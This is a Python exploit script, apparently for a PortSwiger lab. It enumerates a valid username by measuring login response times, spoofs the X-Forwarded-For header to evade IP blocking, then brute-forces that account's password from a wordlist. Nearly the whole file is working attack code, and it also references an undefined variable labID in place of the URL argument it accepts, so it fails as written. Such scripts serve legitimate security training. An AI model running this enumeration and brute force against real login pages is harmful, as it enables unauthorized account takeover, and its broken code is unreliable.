"""
the script abuses a timing vulnerability to enumerate a valid username by observing how long the server takes to respond to login attempts.
then does a brute force to get the correct password for the valid username gotten
"""

import sys # Import sys to pass arguments
import requests # Import the requests module to send requests

if len(sys.argv) != 4 :
    print ("Usage : python3 exploit.py <URL> <Usernames_Wordlist> <Passwords_Wordlist>")
    exit()

url = sys.argv[1] # Pass the lab URL as the 1st argument
username_list = sys.argv[2] # Pass the Usernames wordlist file given by PortSwiger as the 2nd argument
password_list = sys.argv[3] # Pass the Passwords wordlist file given by PortSwiger as the 3rd argument

def start():
    # Open the username list file and read all lines
    with open(username_list, 'r') as file:
        usernames = file.readlines()

    # Strip whitespace and newline characters from each username
    usernames = [i.strip() for i in usernames]
    
    # Open the password list file and read all lines
    with open(password_list, 'r') as file:
        passwords = file.readlines()
    
    # Strip whitespace and newline characters from each password
    passwords = [i.strip() for i in passwords]

    # Construct the target URL using the lab ID
    url = f'https://{labID}.web-security-academy.net/login'
    
    i = 200  # Initialize a counter for the X-Forwarded-For header
    
    # Iterate over each username in the list
    for u in usernames:
        # Prepare the data payload with the current username and a placeholder password
        data = {
            'username': u,
            'password':"@#$%&*"*1000
        }

        # Generate an incremental number for the X-Forwarded-For header to evade the IP block 
        header= {
        'X-Forwarded-For' : f'{i}'
        }
        
        # Send POST request
        req = requests.post(url=url, data=data, headers=header)

        # Check if the response takes more than 5 seconds to return
        if req.elapsed.total_seconds() > 5:
            print(f'## {u} ==> Succeeded!##')
            correct_username = u # Store the correct username
            break  # Exit once credentials are found
        else:
            print(f'- {u} ==> Invalid')
            i += 1 # Increment the number for the next request
    
    # Iterate over each password in the list
    for p in passwords:
        # Prepare POST data with the correct username and iterative password
        data = {
            'username': correct_username,
            'password': p
        }
        
        # Generate an incremental number for the X-Forwarded-For header to evade the IP block 
        header= {
        'X-Forwarded-For' : f'{i}'
        }
        
        # Send POST request
        req = requests.post(url=url, data=data, headers=header)
        
        # Check if the response contains any invalid message
        if 'Invalid username or password.' in req.text:
            print(f'- {p} ==> Invalid')
            i += 1 # Increment the number for the next request
        else:
            print(f'## {p} ==> Succeeded!##')
            break  # Exit once credentials are found
# Call the function
start()
